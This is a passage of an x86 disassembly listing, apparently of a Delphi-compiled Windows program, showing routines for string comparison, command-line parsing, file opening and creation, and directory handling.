                jnz     short loc_3C89
                inc     edx

loc_3C77:                               ; CODE XREF: sub_3C45+42↓j
                cmp     [ecx], ah
                jz      short loc_3C8F
                call    sub_3C45
                test    al, al
                jnz     short loc_3C91
                mov     al, 2Ah ; '*'
                inc     ecx
                jmp     short loc_3C77
; ---------------------------------------------------------------------------

loc_3C89:                               ; CODE XREF: sub_3C45+2F↑j
                mov     ah, [edx]
                xor     ah, [ecx]
                jz      short loc_3C6E

loc_3C8F:                               ; CODE XREF: sub_3C45+22↑j
                                        ; sub_3C45+34↑j
                xor     eax, eax

loc_3C91:                               ; CODE XREF: sub_3C45+6↑j
                                        ; sub_3C45+D↑j ...
                pop     edx
                pop     ecx

locret_3C93:                            ; CODE XREF: sub_3C3C+2↑j
                retn
sub_3C45        endp


; =============== S U B R O U T I N E =======================================


sub_3C94        proc near               ; CODE XREF: sub_476C+1DE↓p
                                        ; sub_476C+21C↓p
                push    esi
                xchg    eax, esi
                push    0
                xchg    eax, edx
                call    sub_3890
                mov     edx, esp
                cmp     byte ptr [eax], 0
                jz      short loc_3CAA
                call    sub_3C08

loc_3CAA:                               ; CODE XREF: sub_3C94+F↑j
                xchg    eax, esi
                push    0
                call    sub_3890
                mov     edx, esp
                cmp     byte ptr [eax], 0
                jz      short loc_3CBE
                call    sub_3C08

loc_3CBE:                               ; CODE XREF: sub_3C94+23↑j
                pop     eax
                pop     edx
                push    edx
                push    eax
                call    sub_3C3C
                xchg    eax, esi
                call    sub_38A8
                call    sub_38A8
                xchg    eax, esi
                pop     esi
                retn
sub_3C94        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3CD8        proc near               ; CODE XREF: sub_4A34+4E↓p
                push    edi
                push    esi
                mov     edi, edx
                xchg    eax, esi
                or      ecx, 0FFFFFFFFh
                xor     eax, eax
                repne scasb
                not     ecx
                mov     edi, edx
                xor     edx, edx
                repe cmpsb
                mov     al, [esi-1]
                mov     dl, [edi-1]
                sub     eax, edx
                pop     esi
                pop     edi
                retn
sub_3CD8        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3CF8        proc near               ; CODE XREF: sub_5184+26↓p
                push    edi
                push    esi
                mov     edi, edx
                xchg    eax, esi
                or      ecx, 0FFFFFFFFh
                xor     eax, eax
                repne scasb
                not     ecx
                mov     edi, edx

loc_3D08:                               ; CODE XREF: sub_3CF8+3C↓j
                xor     edx, edx
                repe cmpsb
                mov     al, [esi-1]
                mov     ah, al
                sub     ah, 61h ; 'a'
                cmp     ah, 19h
                ja      short loc_3D1B
                sub     al, 20h ; ' '

loc_3D1B:                               ; CODE XREF: sub_3CF8+1F↑j
                mov     dl, [edi-1]
                mov     ah, dl
                sub     ah, 61h ; 'a'
                cmp     ah, 19h
                ja      short loc_3D2B
                sub     dl, 20h ; ' '

loc_3D2B:                               ; CODE XREF: sub_3CF8+2E↑j
                mov     ah, 0
                sub     eax, edx
                jnz     short loc_3D36
                cmp     dl, 0
                jnz     short loc_3D08

loc_3D36:                               ; CODE XREF: sub_3CF8+37↑j
                pop     esi
                pop     edi
                retn
sub_3CF8        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3D3C        proc near               ; CODE XREF: sub_5130+18↓p
                                        ; sub_5130+38↓p
                xchg    eax, edi
                xchg    eax, edx
                or      ecx, 0FFFFFFFFh
                xor     eax, eax
                cmp     eax, edi
                jz      short loc_3D4D
                repne scasb
                dec     eax
                dec     eax
                sub     eax, ecx

loc_3D4D:                               ; CODE XREF: sub_3D3C+9↑j
                mov     edi, edx
                retn
sub_3D3C        endp


; =============== S U B R O U T I N E =======================================


sub_3D50        proc near               ; CODE XREF: sub_42D0+8↓p
                                        ; sub_42EC+D↓p ...
                push    esi
                call    sub_3890
                mov     esi, edx
                mov     edx, eax

loc_3D5A:                               ; CODE XREF: sub_3D50+10↓j
                cmp     byte ptr [eax], 0
                jz      short loc_3D62
                inc     eax
                jmp     short loc_3D5A
; ---------------------------------------------------------------------------

loc_3D62:                               ; CODE XREF: sub_3D50+D↑j
                                        ; sub_3D50+28↓j ...
                push    eax

loc_3D63:                               ; CODE XREF: sub_3D50+22↓j
                                        ; sub_3D50+2F↓j
                lodsb
                test    al, al
                jz      short loc_3D81
                push    edx
                xchg    eax, edx
                call    sub_3ADC
                pop     edx
                test    eax, eax
                jz      short loc_3D63
                pop     ecx
                cmp     byte ptr [ecx], 0
                jz      short loc_3D62
                cmp     eax, ecx
                jg      short loc_3D62
                push    ecx
                jle     short loc_3D63

loc_3D81:                               ; CODE XREF: sub_3D50+16↑j
                pop     eax
                pop     esi
                retn
sub_3D50        endp


; =============== S U B R O U T I N E =======================================


sub_3D84        proc near               ; CODE XREF: sub_3DA4↓p
                                        ; sub_3DD0+5C↓p
                jmp     short loc_3D87
; ---------------------------------------------------------------------------

loc_3D86:                               ; CODE XREF: sub_3D84+C↓j
                inc     eax

loc_3D87:                               ; CODE XREF: sub_3D84↑j
                                        ; sub_3D84+1C↓j
                mov     dl, [eax]
                test    dl, dl
                jz      short loc_3D92
                cmp     dl, 20h ; ' '
                jbe     short loc_3D86

loc_3D92:                               ; CODE XREF: sub_3D84+7↑j
                cmp     byte ptr [eax], 22h ; '"'
                jnz     short locret_3DA2
                cmp     byte ptr [eax+1], 22h ; '"'
                jnz     short locret_3DA2
                add     eax, 2
                jmp     short loc_3D87
; ---------------------------------------------------------------------------

locret_3DA2:                            ; CODE XREF: sub_3D84+11↑j
                                        ; sub_3D84+17↑j
                retn
sub_3D84        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3DA4        proc near               ; CODE XREF: sub_3DD0+67↓p
                call    sub_3D84
                jmp     short loc_3DC8
; ---------------------------------------------------------------------------

loc_3DAB:                               ; CODE XREF: sub_3DA4+29↓j
                cmp     dl, 22h ; '"'
                jnz     short loc_3DC7
                inc     eax
                jmp     short loc_3DB4
; ---------------------------------------------------------------------------

loc_3DB3:                               ; CODE XREF: sub_3DA4+19↓j
                inc     eax

loc_3DB4:                               ; CODE XREF: sub_3DA4+D↑j
                mov     dl, [eax]
                test    dl, dl
                jz      short loc_3DBF
                cmp     dl, 22h ; '"'
                jnz     short loc_3DB3

loc_3DBF:                               ; CODE XREF: sub_3DA4+14↑j
                cmp     byte ptr [eax], 0
                jz      short loc_3DC8
                inc     eax
                jmp     short loc_3DC8
; ---------------------------------------------------------------------------

loc_3DC7:                               ; CODE XREF: sub_3DA4+A↑j
                inc     eax

loc_3DC8:                               ; CODE XREF: sub_3DA4+5↑j
                                        ; sub_3DA4+1E↑j ...
                mov     dl, [eax]
                cmp     dl, 20h ; ' '
                ja      short loc_3DAB
                retn
sub_3DA4        endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_3DD0        proc near               ; CODE XREF: sub_3EE8+1C↓p
                                        ; sub_6334+4F↓p ...

var_110         = dword ptr -110h
var_109         = byte ptr -109h
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFEF0h
                push    ebx
                push    esi
                push    edi
                xor     ecx, ecx
                mov     [ebp+var_110], ecx
                mov     [ebp+var_4], edx
                mov     esi, eax
                xor     eax, eax
                push    ebp
                push    404ADAh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                test    esi, esi
                jnz     short loc_3E23
                push    105h
                lea     eax, [ebp+var_109]
                push    eax
                push    0
                call    sub_3498
                mov     ecx, eax
                lea     edx, [ebp+var_109]
                mov     eax, [ebp+var_4]
                call    sub_2584
                jmp     loc_3EC1
; ---------------------------------------------------------------------------

loc_3E23:                               ; CODE XREF: sub_3DD0+29↑j
                call    sub_3460
                mov     ebx, eax

loc_3E2A:                               ; CODE XREF: sub_3DD0+79↓j
                mov     eax, ebx
                call    sub_3D84
                mov     ebx, eax
                mov     edi, ebx
                mov     eax, ebx
                call    sub_3DA4
                mov     ebx, eax
                test    esi, esi
                jz      short loc_3E4B
                dec     esi
                test    esi, esi
                jl      short loc_3E4B
                cmp     edi, ebx
                jnz     short loc_3E2A

loc_3E4B:                               ; CODE XREF: sub_3DD0+70↑j
                                        ; sub_3DD0+75↑j
                mov     eax, [ebp+var_4]
                push    eax
                lea     eax, [ebp+var_110]
                mov     edx, edi
                call    sub_25C4
                mov     eax, [ebp+var_110]
                mov     ecx, ebx
                sub     ecx, edi
                mov     edx, 1
                call    sub_2864
                mov     eax, [ebp+var_4]
                mov     eax, [eax]
                call    sub_260C
                cmp     eax, 2
                jl      short loc_3EC1
                mov     eax, [ebp+var_4]
                mov     eax, [eax]
                cmp     byte ptr [eax], 22h ; '"'
                jnz     short loc_3EC1
                mov     eax, [ebp+var_4]
                mov     eax, [eax]
                call    sub_260C
                mov     edx, [ebp+var_4]
                mov     edx, [edx]
                cmp     byte ptr [edx+eax-1], 22h ; '"'
                jnz     short loc_3EC1
                mov     eax, [ebp+var_4]
                push    eax
                mov     eax, [ebp+var_4]
                mov     eax, [eax]
                call    sub_260C
                mov     ecx, eax
                sub     ecx, 2
                mov     eax, [ebp+var_4]
                mov     eax, [eax]
                mov     edx, 2
                call    sub_2864

loc_3EC1:                               ; CODE XREF: sub_3DD0+4E↑j
                                        ; sub_3DD0+AD↑j ...
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    404AE1h

loc_3ECE:                               ; CODE XREF: CODE:00003EDF↓j
                lea     eax, [ebp+var_110]
                call    sub_2494
                retn
sub_3DD0        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_3ECE
; ---------------------------------------------------------------------------
                pop     edi
                pop     esi
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_3EE8        proc near               ; CODE XREF: sub_6334+3C↓p
                                        ; sub_719C:loc_71DC↓p ...

var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                push    0
                push    ebx
                xor     eax, eax
                push    ebp
                push    404B28h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                xor     ebx, ebx

loc_3EFE:                               ; CODE XREF: sub_3EE8+28↓j
                lea     edx, [ebp+var_4]
                lea     eax, [ebx+1]
                call    sub_3DD0
                cmp     [ebp+var_4], 0
                jz      short loc_3F12
                inc     ebx
                jmp     short loc_3EFE
; ---------------------------------------------------------------------------

loc_3F12:                               ; CODE XREF: sub_3EE8+25↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    404B2Fh

loc_3F1F:                               ; CODE XREF: CODE:00003F2D↓j
                lea     eax, [ebp+var_4]
                call    sub_2494
                retn
sub_3EE8        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_3F1F
; ---------------------------------------------------------------------------
                mov     eax, ebx
                pop     ebx
                pop     ecx
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3F38        proc near               ; CODE XREF: sub_65D0+C1↓p
                                        ; sub_65D0+E8↓p
                xor     ecx, ecx

loc_3F3A:                               ; CODE XREF: sub_3F38+26↓j
                mov     cl, [edx]
                inc     edx
                mov     ch, [eax]
                inc     eax
                jecxz   short loc_3F60
                cmp     cl, 61h ; 'a'
                jb      short loc_3F4F
                cmp     cl, 7Ah ; 'z'
                ja      short loc_3F4F
                sub     cl, 20h ; ' '

loc_3F4F:                               ; CODE XREF: sub_3F38+D↑j
                                        ; sub_3F38+12↑j
                cmp     ch, 61h ; 'a'
                jb      short loc_3F5C
                cmp     ch, 7Ah ; 'z'
                ja      short loc_3F5C
                sub     ch, 20h ; ' '

loc_3F5C:                               ; CODE XREF: sub_3F38+1A↑j
                                        ; sub_3F38+1F↑j
                cmp     cl, ch
                jz      short loc_3F3A

loc_3F60:                               ; CODE XREF: sub_3F38+8↑j
                test    cl, cl
                setz    al
                retn
sub_3F38        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3F68        proc near               ; CODE XREF: sub_3FF8+37↓p
                                        ; sub_4078+37↓p ...
                xor     ecx, ecx
                push    ecx
                mov     ecx, edx
                shr     ecx, 10h
                and     cx, 1FFFh
                jnz     short loc_3F79
                mov     cl, 80h

loc_3F79:                               ; CODE XREF: sub_3F68+D↑j
                push    ecx
                mov     cl, dh
                push    ecx
                push    0
                mov     cl, dl
                push    ecx
                mov     dx, 0
                push    edx
                push    eax
                call    sub_3408
                retn
sub_3F68        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_3F90        proc near               ; CODE XREF: sub_3FF8+53↓p
                                        ; sub_4078+53↓p ...
                push    eax
                call    sub_33F8
                test    eax, eax
                setnz   al
                retn
sub_3F90        endp


; =============== S U B R O U T I N E =======================================


sub_3F9C        proc near               ; CODE XREF: sub_4F84+2D↓p
                                        ; sub_6DA0+5B↓p ...
                call    sub_3890
                push    eax
                call    sub_3470
                inc     eax
                jz      short locret_3FB0
                dec     eax
                and     al, 10h
                setz    al

locret_3FB0:                            ; CODE XREF: sub_3F9C+C↑j
                retn
sub_3F9C        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3FB4        proc near               ; CODE XREF: CODE:00004DDB↓p
                                        ; sub_6530+44↓p ...
                movzx   ecx, cl
                push    ecx
                push    0
                push    edx
                push    eax
                call    sub_34E0
                retn
sub_3FB4        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_3FC4        proc near               ; CODE XREF: sub_4078+4A↓p
                                        ; CODE:00004E03↓p ...
                push    ebp
                push    0
                mov     ebp, esp
                push    0
                push    ebp
                push    ecx
                push    edx
                push    eax
                call    sub_34B8
                test    eax, eax
                pop     eax
                jnz     short loc_3FDB
                xor     eax, eax

loc_3FDB:                               ; CODE XREF: sub_3FC4+13↑j
                pop     ebp
                retn
sub_3FC4        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_3FE0        proc near               ; CODE XREF: sub_3FF8+4A↓p
                                        ; CODE:00004E0F↓p ...
                push    ebp
                push    ebp
                mov     ebp, esp
                push    0
                push    ebp
                push    ecx
                push    edx
                push    eax
                call    sub_34F0
                test    eax, eax
                pop     eax
                jnz     short loc_3FF6
                xor     eax, eax

loc_3FF6:                               ; CODE XREF: sub_3FE0+12↑j
                pop     ebp
                retn
sub_3FE0        endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_3FF8        proc near               ; CODE XREF: sub_620C+5C↓p
                                        ; sub_6DA0+84↓p

var_8           = dword ptr -8
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFFF8h
                push    ebx
                push    esi
                push    edi
                xor     ebx, ebx
                mov     [ebp+var_8], ebx
                mov     [ebp+var_4], ecx
                mov     edi, edx
                mov     ebx, eax
                xor     eax, eax
                push    ebp
                push    404C66h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                xor     esi, esi
                lea     eax, [ebp+var_8]
                mov     edx, ebx
                call    sub_25C4
                mov     eax, [ebp+var_8]
                mov     edx, 40000400h
                call    sub_3F68
                mov     ebx, eax
                cmp     ebx, 0FFFFFFFFh
                jz      short loc_4050
                mov     edx, edi
                mov     ecx, [ebp+var_4]
                mov     eax, ebx
                call    sub_3FE0
                mov     esi, eax
                mov     eax, ebx
                call    sub_3F90

loc_4050:                               ; CODE XREF: sub_3FF8+41↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    404C6Dh

loc_405D:                               ; CODE XREF: CODE:0000406B↓j
                lea     eax, [ebp+var_8]
                call    sub_2494
                retn
sub_3FF8        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_405D
; ---------------------------------------------------------------------------
                mov     eax, esi
                pop     edi
                pop     esi
                pop     ebx
                pop     ecx
                pop     ecx
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4078        proc near               ; CODE XREF: sub_6294+56↓p
                                        ; sub_64DC+2F↓p

var_8           = dword ptr -8
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFFF8h
                push    ebx
                push    esi
                push    edi
                xor     ebx, ebx
                mov     [ebp+var_8], ebx
                mov     [ebp+var_4], ecx
                mov     edi, edx
                mov     ebx, eax
                xor     eax, eax
                push    ebp
                push    404CE6h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                xor     esi, esi
                lea     eax, [ebp+var_8]
                mov     edx, ebx
                call    sub_25C4
                mov     eax, [ebp+var_8]
                mov     edx, 80000301h
                call    sub_3F68
                mov     ebx, eax
                cmp     ebx, 0FFFFFFFFh
                jz      short loc_40D0
                mov     edx, edi
                mov     ecx, [ebp+var_4]
                mov     eax, ebx
                call    sub_3FC4
                mov     esi, eax
                mov     eax, ebx
                call    sub_3F90

loc_40D0:                               ; CODE XREF: sub_4078+41↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    404CEDh

loc_40DD:                               ; CODE XREF: CODE:000040EB↓j
                lea     eax, [ebp+var_8]
                call    sub_2494
                retn
sub_4078        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_40DD
; ---------------------------------------------------------------------------
                mov     eax, esi
                pop     edi
                pop     esi
                pop     ebx
                pop     ecx
                pop     ecx
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_40F8        proc near               ; CODE XREF: sub_41E0+5A↓p
                push    eax
                call    sub_3470
                inc     eax
                jz      short locret_4107
                dec     eax
                and     al, 10h
                setnz   al

locret_4107:                            ; CODE XREF: sub_40F8+7↑j
                retn
sub_40F8        endp


; =============== S U B R O U T I N E =======================================


sub_4108        proc near               ; CODE XREF: sub_41CC+C↓p
                push    ebx
                push    esi
                push    edi
                mov     edi, ecx
                mov     ebx, edx
                mov     esi, eax
                mov     eax, edi
                mov     edx, esi
                call    sub_24E8
                cmp     dword ptr [edi], 0
                jz      short loc_4143
                mov     eax, [edi]
                call    sub_260C
                mov     edx, [edi]
                cmp     bl, [edx+eax-1]
                jnz     short loc_4143
                mov     eax, [edi]
                call    sub_260C
                mov     edx, eax
                mov     eax, edi
                mov     ecx, 1
                call    sub_28A4

loc_4143:                               ; CODE XREF: sub_4108+15↑j
                                        ; sub_4108+24↑j
                pop     edi
                pop     esi
                pop     ebx
                retn
sub_4108        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4148        proc near               ; CODE XREF: sub_41B8+C↓p

var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                push    0
                push    ebx
                push    esi
                push    edi
                mov     esi, ecx
                mov     ebx, edx
                mov     edi, eax
                xor     eax, eax
                push    ebp
                push    404DABh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     eax, esi
                mov     edx, edi
                call    sub_24E8
                cmp     dword ptr [esi], 0
                jz      short loc_4181
                mov     eax, [esi]
                call    sub_260C
                mov     edx, [esi]
                cmp     bl, [edx+eax-1]
                jz      short loc_4195

loc_4181:                               ; CODE XREF: sub_4148+28↑j
                lea     eax, [ebp+var_4]
                mov     edx, ebx
                call    sub_25B4
                mov     edx, [ebp+var_4]
                mov     eax, esi
                call    sub_2614

loc_4195:                               ; CODE XREF: sub_4148+37↑j
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    404DB2h

loc_41A2:                               ; CODE XREF: CODE:000041B0↓j
                lea     eax, [ebp+var_4]
                call    sub_2494
                retn
sub_4148        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_41A2
; ---------------------------------------------------------------------------
                pop     edi
                pop     esi
                pop     ebx
                pop     ecx
                pop     ebp
                retn

; =============== S U B R O U T I N E =======================================


sub_41B8        proc near               ; CODE XREF: sub_4390+4C↓p
                                        ; sub_4408+4C↓p ...
                push    ebx
                push    esi
                mov     esi, edx
                mov     ebx, eax
                mov     ecx, esi
                mov     dl, 5Ch ; '\'
                mov     eax, ebx
                call    sub_4148
                pop     esi
                pop     ebx
                retn
sub_41B8        endp


; =============== S U B R O U T I N E =======================================


sub_41CC        proc near               ; CODE XREF: sub_41E0+3A↓p
                push    ebx
                push    esi
                mov     esi, edx
                mov     ebx, eax
                mov     ecx, esi
                mov     dl, 5Ch ; '\'
                mov     eax, ebx
                call    sub_4108
                pop     esi
                pop     ebx
                retn
sub_41CC        endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_41E0        proc near               ; CODE XREF: sub_41E0+89↓p
                                        ; sub_6A78+57↓p

var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                xor     ecx, ecx
                push    ecx
                push    ecx
                push    ecx
                push    ecx
                push    ebx
                mov     [ebp+var_4], eax
                mov     eax, [ebp+var_4]
                call    sub_27FC
                xor     eax, eax
                push    ebp
                push    404E9Fh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     eax, [ebp+var_4]
                call    sub_260C
                test    eax, eax
                setnle  bl
                test    bl, bl
                jz      short loc_4284
                lea     edx, [ebp+var_8]
                mov     eax, [ebp+var_4]
                call    sub_41CC
                mov     edx, [ebp+var_8]
                lea     eax, [ebp+var_4]
                call    sub_252C
                mov     eax, [ebp+var_4]
                call    sub_260C
                cmp     eax, 3
                jl      short loc_4284
                mov     eax, [ebp+var_4]
                call    sub_40F8
                test    al, al
                jnz     short loc_4284
                lea     edx, [ebp+var_C]
                mov     eax, [ebp+var_4]
                call    sub_42EC
                mov     eax, [ebp+var_C]
                mov     edx, [ebp+var_4]
                call    sub_2758
                jz      short loc_4284
                lea     edx, [ebp+var_10]
                mov     eax, [ebp+var_4]
                call    sub_42EC
                mov     eax, [ebp+var_10]
                call    sub_41E0
                test    al, al
                jz      short loc_427E
                mov     eax, [ebp+var_4]
                call    sub_42B0
                test    al, al
                jnz     short loc_4282

loc_427E:                               ; CODE XREF: sub_41E0+90↑j
                xor     ebx, ebx
                jmp     short loc_4284
; ---------------------------------------------------------------------------

loc_4282:                               ; CODE XREF: sub_41E0+9C↑j
                mov     bl, 1

loc_4284:                               ; CODE XREF: sub_41E0+32↑j
                                        ; sub_41E0+55↑j ...
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    404EA6h

loc_4291:                               ; CODE XREF: CODE:000042A4↓j
                lea     eax, [ebp+var_10]
                mov     edx, 4
                call    sub_24B8
                retn
sub_41E0        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_4291
; ---------------------------------------------------------------------------
                mov     eax, ebx
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================


sub_42B0        proc near               ; CODE XREF: sub_41E0+95↑p
                push    ebx
                mov     ebx, eax
                push    0
                mov     eax, ebx
                call    sub_280C
                push    eax
                call    sub_3400
                cmp     eax, 1
                sbb     eax, eax
                inc     eax
                pop     ebx
                retn
sub_42B0        endp

; ---------------------------------------------------------------------------
                align 4
                cmp     bl, [eax+eax+0]

; =============== S U B R O U T I N E =======================================


sub_42D0        proc near               ; CODE XREF: sub_4600+1F↓p
                                        ; sub_6A78+12C↓p ...
                push    edx
                push    eax
                mov     edx, ds:4090ECh
                call    sub_3D50
                pop     edx
                cmp     byte ptr [eax], 0
                jz      short loc_42E5
                xchg    eax, edx
                inc     edx

loc_42E5:                               ; CODE XREF: sub_42D0+11↑j
                pop     eax
                call    sub_25C4
                retn
sub_42D0        endp


; =============== S U B R O U T I N E =======================================


sub_42EC        proc near               ; CODE XREF: sub_41E0+69↑p
                                        ; sub_41E0+81↑p ...
                push    edx
                mov     edx, ds:4090ECh
                call    sub_3890
                push    eax
                call    sub_3D50
                xchg    eax, edx
                xor     ecx, ecx
                pop     eax
                cmp     [edx], cl
                jz      short loc_430B
                sub     edx, eax
                inc     edx
                xchg    eax, edx
                xchg    eax, ecx

loc_430B:                               ; CODE XREF: sub_42EC+18↑j
                pop     eax
                call    sub_2584
                retn
sub_42EC        endp

; ---------------------------------------------------------------------------
                align 4
                dd 2Eh

; =============== S U B R O U T I N E =======================================


sub_4318        proc near               ; CODE XREF: sub_63E4+35↓p
                push    edx
                mov     edx, ds:4090F0h
                call    sub_3890
                call    sub_3D50
                xchg    eax, edx
                pop     eax
                call    sub_25C4
                retn
sub_4318        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_4334        proc near               ; CODE XREF: sub_65D0+8A↓p

var_10C         = byte ptr -10Ch

                push    ebx
                push    esi
                add     esp, 0FFFFFEFCh
                mov     esi, edx
                mov     ebx, eax
                push    104h
                lea     eax, [esp+110h+var_10C]
                push    eax
                mov     eax, ebx
                call    sub_280C
                push    eax
                call    sub_34A0
                mov     ecx, eax
                mov     edx, esp
                mov     eax, esi
                call    sub_2584
                add     esp, 104h
                pop     esi
                pop     ebx
                retn
sub_4334        endp

; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================


sub_436C        proc near               ; CODE XREF: sub_65D0+10E↓p
                                        ; CODE:00007586↓p

var_120         = dword ptr -120h

                add     esp, 0FFFFFEC0h
                push    esp
                push    eax
                call    sub_3448
                inc     eax
                jz      short loc_4387
                dec     eax
                push    eax
                call    sub_3440
                mov     eax, [esp+140h+var_120]

loc_4387:                               ; CODE XREF: sub_436C+E↑j
                add     esp, 140h
                retn
sub_436C        endp

; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4390        proc near               ; CODE XREF: sub_65D0+A3↓p
                                        ; sub_6DA0+47↓p ...

var_10C         = dword ptr -10Ch
var_105         = byte ptr -105h

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFEF4h
                push    ebx
                xor     edx, edx
                mov     [ebp+var_10C], edx
                mov     ebx, eax
                xor     eax, eax
                push    ebp
                push    404FFAh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                push    105h
                lea     eax, [ebp+var_105]
                push    eax
                call    sub_34B0
                lea     eax, [ebp+var_10C]
                lea     edx, [ebp+var_105]
                call    sub_25C4
                mov     eax, [ebp+var_10C]
                mov     edx, ebx
                call    sub_41B8
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    405001h

loc_43EE:                               ; CODE XREF: CODE:000043FF↓j
                lea     eax, [ebp+var_10C]
                call    sub_2494
                retn
sub_4390        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_43EE
; ---------------------------------------------------------------------------
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 4

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4408        proc near               ; CODE XREF: sub_620C+28↓p
                                        ; sub_6294+22↓p ...

var_10C         = dword ptr -10Ch
var_105         = byte ptr -105h

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFEF4h
                push    ebx
                xor     edx, edx
                mov     [ebp+var_10C], edx
                mov     ebx, eax
                xor     eax, eax
                push    ebp
                push    405072h
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                lea     eax, [ebp+var_105]
                push    eax
                push    105h
                call    sub_34A8
                lea     eax, [ebp+var_10C]
                lea     edx, [ebp+var_105]
                call    sub_25C4
                mov     eax, [ebp+var_10C]
                mov     edx, ebx
                call    sub_41B8
                xor     eax, eax
                pop     edx
                pop     ecx
                pop     ecx
                mov     fs:[eax], edx
                push    405079h

loc_4466:                               ; CODE XREF: CODE:00004477↓j
                lea     eax, [ebp+var_10C]
                call    sub_2494
                retn
sub_4408        endp ; sp-analysis failed

; ---------------------------------------------------------------------------
                jmp     loc_1F30
; ---------------------------------------------------------------------------
                jmp     short loc_4466
; ---------------------------------------------------------------------------
                pop     ebx
                mov     esp, ebp
                pop     ebp
                retn
; ---------------------------------------------------------------------------
                align 10h

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4480        proc near               ; CODE XREF: sub_4600+39↓p

var_154         = dword ptr -154h
var_150         = dword ptr -150h
var_14C         = dword ptr -14Ch
var_120         = byte ptr -120h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4

                push    ebp
                mov     ebp, esp
                add     esp, 0FFFFFEACh
                push    ebx
                push    esi
                xor     ebx, ebx
                mov     [ebp+var_154], ebx
                mov     [ebp+var_150], ebx
                mov     [ebp+var_C], ebx
                mov     ebx, ecx
                mov     [ebp+var_8], edx
                mov     [ebp+var_4], eax
                mov     eax, [ebp+var_4]
                call    sub_27FC
                mov     eax, [ebp+var_8]
                call    sub_27FC
                xor     eax, eax
                push    ebp
                push    4051DBh
                push    dword ptr fs:[eax]
                mov     fs:[eax], esp
                mov     eax, ebx
                call    sub_2494
                cmp     [ebp+var_4], 0
                jz      short loc_44EE
                mov     eax, [ebp+var_4]
